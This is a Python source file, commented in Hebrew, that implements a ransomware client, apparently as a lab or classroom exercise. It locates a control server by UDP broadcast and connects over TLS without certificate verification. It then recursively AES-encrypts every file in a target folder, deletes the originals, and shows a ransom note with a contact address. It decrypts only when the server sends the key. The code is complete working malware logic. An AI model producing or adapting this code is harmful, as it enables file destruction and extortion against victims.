import socket
import ssl
import os
import sys
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import protocol

class SecureSocketClient:
    # מחלקה שאחראית רק על יצירת socket עם TLS

    def __init__(self):
        self.host = self.find_server_address(44444)
        self.port = 55555
        self.context = ssl._create_unverified_context()


    def find_server_address(self, brodcast_port):
        discovery = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        discovery.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST,1)

        discovery.sendto(b"DISCOVER_SERVER",("255.255.255.255",brodcast_port))

        msg,server_addr = discovery.recvfrom(1024)
        host = server_addr[0]
        return host
    
    def connect_tls_socket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        secure_sock = self.context.wrap_socket(sock, server_hostname="anything")
        secure_sock.connect((self.host, self.port))
        print("[+] Connected to server via SSL.")
        return secure_sock


class FileEncryptor:
    # אחראי על הצפנה ופענוח של קבצים

    @staticmethod
    def encrypt_folder(folder_path, aes_key):
        for file_name in os.listdir(folder_path):
            full_path = os.path.join(folder_path, file_name)
            if os.path.isfile(full_path):
                try:
                    with open(full_path, "rb") as f:
                        file_data = f.read()

                    iv = get_random_bytes(16)
                    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
                    encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))

                    with open(full_path + "_", "wb") as f:
                        f.write(iv + encrypted_data)

                    os.remove(full_path)
                except Exception:
                    os.remove(full_path + "_")
                    continue
            elif os.path.isdir(full_path):
                FileEncryptor.encrypt_folder(full_path, aes_key)

    @staticmethod
    def decrypt_folder(folder_path, aes_key):
        for file_name in os.listdir(folder_path):
            full_path = os.path.join(folder_path, file_name)
            if os.path.isfile(full_path):
                try:
                    with open(full_path, "rb") as f:
                        file_data = f.read()

                    iv = file_data[:16]
                    encrypted_data = file_data[16:]
                    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
                    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

                    decrypted_path = full_path.rstrip("_")
                    with open(decrypted_path, "wb") as f:
                        f.write(decrypted_data)

                    os.remove(full_path)
                except Exception:
                    continue
            elif os.path.isdir(full_path):
                FileEncryptor.decrypt_folder(full_path, aes_key)


class RansomNote:
    # אחראי על הצגת הודעות לקורבן

    @staticmethod
    def display_encryption_note():
        note = """
        🔒 All your files have been encrypted!
        
        To get the key and decrypt your files, contact us.
        hackers@example.com
        """
        with open("ANNOUNCEMENT.txt", "w", encoding="utf-8") as f:
            f.write(note)
        os.system('start /b notepad ANNOUNCEMENT.txt')
        
    @staticmethod
    def display_decryption_note():
        note = """
        🔓 All your files have been decrypted!
        Your system is restored and your files are back to normal.
        """
        with open("ANNOUNCEMENT.txt", "w", encoding="utf-8") as f:
            f.write(note)
        os.system('start /b notepad ANNOUNCEMENT.txt')
        
    @staticmethod
    def del_note():
        file_name = "ANNOUNCEMENT.txt"
        
        if os.path.exists(file_name):
            os.remove(file_name)


class TrojanClient:
    # מחלקה שמבצעת את תקשורת השליטה לפי פרוטוקול

    def __init__(self, folder, conn):
        self.folder = folder
        self.connection = conn

    def encryption(self, aes_key):
        FileEncryptor.encrypt_folder(self.folder, aes_key)
        del aes_key
        RansomNote.display_encryption_note()
        RansomNote.del_note()
        protocol.send(self.connection, "the files are encrypted")
    
    def decryption(self, aes_key):
        FileEncryptor.decrypt_folder(self.folder, aes_key)
        del aes_key
        RansomNote.display_decryption_note()
        RansomNote.del_note()
        protocol.send(self.connection, "the files are decrypted")

    def handle_server(self):
        aes_key = protocol.receive(self.connection)
        
        # encryption
        self.encryption(aes_key)
        
        msg = protocol.receive(self.connection)
        msg_decode = msg.decode()
        if (msg_decode != "sending decryption key"):
            raise ValueError("unexpected message")

        aes_key = protocol.receive(self.connection)

        #decrepption
        self.decryption(aes_key)
        
        sys.exit()



if __name__ == "__main__":
    FOLDER = "D:\check"

    client = SecureSocketClient()
    conn = client.connect_tls_socket()
    
    with conn:
        client = TrojanClient(FOLDER, conn)
        client.handle_server()